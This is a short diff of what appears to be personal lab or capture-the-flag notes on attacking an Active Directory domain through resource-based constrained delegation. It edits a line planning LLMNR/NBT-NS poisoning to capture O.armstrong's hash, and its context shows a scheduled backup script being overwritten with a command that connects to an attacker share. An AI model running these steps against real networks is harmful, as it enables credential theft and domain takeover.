@@ -149,7 +149,7 @@ Set-Content C:\Scripts\backup.bat 'powershell -Command "Set-ADComputer K2ROOTDC 
 ![[assets/Pasted image 20260224210108.png]]
 	Success. This means we can preform RBCD attack. Armstrong is able to modify the account.
 	First, Let's create a new account. But let's first get armstrong's credential. 
-	For now, We are able to use the script to run the command. So how about we preform a LLMNR or NBT-posion attack?
+	For now, We are able to use the script to run the command. So how about we preform a LLMNR or NBT-posion attack to get O.armstrong's  hash.
 
 ```
 Set-Content C:\Scripts\backup.bat 'cmd /c dir \\IP\share'
